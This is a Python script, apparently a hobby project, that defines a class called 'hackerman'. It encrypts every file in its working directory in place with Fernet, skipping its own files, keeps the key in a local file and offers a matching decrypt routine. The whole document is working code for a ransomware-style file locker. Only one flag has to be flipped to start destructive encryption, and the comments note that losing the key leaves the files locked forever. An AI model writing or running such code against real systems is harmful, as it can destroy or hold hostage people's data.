from cryptography.fernet import Fernet
import os

class hackerman:
    def __init__(self):
        self.no_touch_files = ["hackerman.py",'secret_key.key',"savior.py","master.py"] #files to ignore
        self.files_to_encrypt = []
        self.files_to_decrypt = self.files_to_encrypt
        self.encrypt_key = b""

        self.get_files() #calls this method to get all files in current directory looks for files to encrypt/decrypt


    def get_files(self):
        for file in os.listdir():
            if file in self.no_touch_files: #checks if current file in loop is in files to ignore list True -> skips to next file
                continue

            if os.path.isfile(file): #checks if current file in loop is a actual file not a folder True -> adds file to list to encrypt
                self.files_to_encrypt.append(file)

        return self.files_to_encrypt,self.files_to_decrypt #returns 2 list

    def create_encryption_key(self,hide_key:bool=True,key_file_name:str="secret_key"):
        self.encrypt_key = Fernet.generate_key() #generates key for all encryptions
        if hide_key:
            key_file_name += ".key"
            with open(key_file_name,"wb") as secret_key: #writes encryption key to seperate file 
                secret_key.write(self.encrypt_key)

        return self.encrypt_key #returns encyrpted key should not be returned in actual case

    def import_encryption_key(self,key_file_name:str="secret_key"):
        key_file_name += ".key" #adds the .key extensions to whatever key_file_name is passed
        with open(key_file_name,"rb") as key:
            self.encrypt_key = key.read()

        return self.encrypt_key#returns encyrpted key should not be returned in actual case

    def encrypt(self):
        for uncrypted_file in self.files_to_encrypt: 
            with open(uncrypted_file,"rb") as file: #opens the current file in loop
                secret_content = file.read() #returns all content in current file in loop

            encryption = Fernet(self.encrypt_key) #initializes encryption
            encrypted_data = encryption.encrypt(secret_content) #encrypts data in file
            # print(token)

            with open(uncrypted_file,"wb") as file: #opens file in loop and replaces data with encrypted bytes
                file.write(encrypted_data)

        return self.files_to_encrypt #returns a list of all encrypted files

    def decrypt(self):
        for encrypted_file in self.files_to_decrypt: 
            with open(encrypted_file,"rb") as file: #opens the current file in loop
                secret_content = file.read() #returns all content in current file in loop

            encryption = Fernet(self.encrypt_key) #initializes encryption using key argument
            decrypted_data = encryption.decrypt(secret_content) #decrypts data in file
                # print(token)

            with open(encrypted_file,"wb") as file: #opens file in loop and replaces data with encrypted bytes
                file.write(decrypted_data)

        return self.files_to_decrypt #returns a list of all decrypted files

h = hackerman()
# h.files_to_encrypt.append("hello.py") #incase want to import files that are already incrypted

# h.get_files() #looks for files to encrypt/decrypt
encrypt = False
if encrypt == True:
    h.create_encryption_key() #generates a fernet 32-bit encryption key
    h.encrypt() #encrypts files that were found in get_files method

elif encrypt == False:
    h.import_encryption_key() #import fernet encryption key from seperate file if files were already encrypted and key was created
    h.decrypt() #decryptes files that were found in get_files method



## NOTE
#Do no call encrypt function more than once on files that are already encrypted it will encrypt the already encrypted files
#Do not call create_encryption_key more than once because it will generate a new key and replace the old one forever locking the files encrypted using the first key
#The create_encryption_key and encrypt class methods are called in pairs as this will generate a key and encrypt files using that key
#The import_encryption_key and decrypt class methods are called in pairs as this will import the key that was used to encrypt files and use it to decrypt files

# print(__file__)
# print(os.path.dirname(os.path.realpath(__file__)))